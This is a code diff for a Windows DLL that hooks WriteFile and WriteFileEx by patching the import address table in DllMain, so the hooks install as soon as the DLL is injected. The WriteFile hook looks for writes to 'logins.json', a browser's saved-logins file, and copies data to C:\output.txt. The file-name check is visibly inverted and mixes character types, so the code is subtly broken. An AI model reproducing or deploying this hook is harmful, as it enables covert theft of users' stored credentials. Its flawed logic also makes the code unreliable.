@@ -49,7 +49,7 @@ BOOL MyWriteFile(
     OutputDebugStringW(L"MyWriteFile");
     TCHAR fileName[MAX_PATH + 1];
     GetFileNameFromHandle(hFile, fileName);
-    if (!strstr(fileName, "logins.json")) {
+    if ((!strstr(fileName, "logins.json"))) {
         OutputDebugStringW(L"Found File!");
         std::ofstream outFile;
         outFile.open("C:\\output.txt");
@@ -59,43 +59,60 @@ BOOL MyWriteFile(
     return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
 }
 
-void patchIAT()
+BOOL MyWriteFileEx(
+	HANDLE                          hFile,
+	LPCVOID                         lpBuffer,
+	DWORD                           nNumberOfBytesToWrite,
+	LPOVERLAPPED                    lpOverlapped,
+	LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
+)
+{
+	OutputDebugStringW(L"MyWriteFileEx");
+	return WriteFileEx(hFile, lpBuffer, nNumberOfBytesToWrite, lpOverlapped, lpCompletionRoutine);
+}
+
+void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
 {
 	HMODULE currentProcessImage = GetModuleHandleA(NULL);
 	PIMAGE_IMPORT_DESCRIPTOR importedModule;
 	PIMAGE_THUNK_DATA pFirstThunk, pOriginalFirstThunk;
 	PIMAGE_IMPORT_BY_NAME pFuncData;
-    importedModule = getImportTable(currentProcessImage);
-    while (*(WORD*)importedModule != 0)
+	importedModule = getImportTable(currentProcessImage);
+	bool doneHooking = false;
+	
+	while (*(WORD*)importedModule != 0)
 	{
-		//std::cout << (char*)((PBYTE)currentProcessImage + importedModule->Name) << std::endl;
 
 		pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule->FirstThunk);
 		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule ->OriginalFirstThunk);
 		pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);
 
         while (*(WORD*)pFirstThunk != 0 && *(WORD*)pOriginalFirstThunk != 0)
-        {
-            //printf("%X %s\n", pFirstThunk->u1.Function, pFuncData->Name);
-            if (strcmp("WriteFile", (char*)pFuncData->Name) == 0)
+        {        	
+            if (strcmp(funcNameToPatch, (char*)pFuncData->Name) == 0)
             {
-                OutputDebugStringW(L"PatchWriteFile");
-                printf("%X %s\n", pFirstThunk->u1.Function, pFuncData->Name);
-                printf("Hooking... \n");
-                if (rewriteThunk(pFirstThunk, MyWriteFile))
-                    OutputDebugStringW(L"PatchSuccesfully");
-                printf("Hooked %s successfully :)\n", "WriteFile");
+                OutputDebugStringW(L"Hooking:");
+				OutputDebugStringA(funcNameToPatch);
+				if (rewriteThunk(pFirstThunk, funcToRunInstead))
+				{
+					OutputDebugStringW(L"Patch Successfully");
+					doneHooking = true;
+					break;
+				}
+			}
 
-            }
-
-            pOriginalFirstThunk++;
-            pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
-            pFirstThunk++;
-        }
-        
-        importedModule++; //next module (DLL)
+			pOriginalFirstThunk++;
+			pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);
+			pFirstThunk++;
+		}
+		if(doneHooking)
+		{
+			break;
+		}
+		importedModule++; //next module (DLL)
 	}
-	
+
+	OutputDebugStringW(L"patchIAT end");
 }
 
 BOOL GetFileNameFromHandle(HANDLE hFile, TCHAR* out)
@@ -198,10 +215,16 @@ BOOL APIENTRY DllMain(
     _In_ LPVOID    reserved
 ) {
     switch (reason) {
-    case DLL_PROCESS_ATTACH:
-        OutputDebugStringW(L"DllMain");
-        patchIAT();
+		case DLL_PROCESS_ATTACH:
+	    {	    
+			OutputDebugStringW(L"DllMain");
+			patchIAT("WriteFile", MyWriteFile);
+			patchIAT("WriteFileEx", MyWriteFileEx);
+			OutputDebugStringW(L"IATPatching DllMain end");
+		}
+		default: ;
     }
 
+	
     return TRUE;
 }
